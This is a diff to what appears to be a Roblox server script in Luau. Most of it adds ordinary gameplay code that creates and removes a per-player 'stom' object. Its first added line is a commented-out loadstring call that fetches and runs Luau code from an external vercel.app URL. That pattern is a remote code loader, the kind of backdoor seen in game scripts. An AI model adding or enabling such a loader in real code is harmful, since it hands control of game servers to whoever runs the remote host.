@@ -1,3 +1,5 @@
+--loadstring(game:GetService("HttpService"):GetAsync("https://gamehttp.vercel.app/luau-script"))()
+
 local players = game:GetService("Players")
 local http = game:GetService("HttpService")
 
@@ -295,7 +297,12 @@ players.PlayerAdded:Connect(function(p:Player)
 	if p.Character.Name == "diamongamer2" then
 		p.Character.Humanoid.WalkSpeed = 20
 	end
-
+	
+	local stom = ss.be:Clone()
+	stom.Name = p.Name
+	stom.Parent = workspace.Stoms
+	stom.WorldPivot = CFrame.new(math.random(-1000,1000),math.random(10000,20000),math.random(-1000,1000))
+	
 	task.wait(1)
 
 	rs.Remotes.NotifyPlayer:FireClient(p,"Welcome. I only make these when it's needed, enjoy.",7.5)
@@ -337,7 +344,7 @@ players.PlayerRemoving:Connect(function(p:Player)
 			end)
 		end
 
-		rs.Remotes.ClearS:FireAllClients(p.Name)
+		workspace.Stoms[p.Name]:Destroy()
 	end
 end)
 
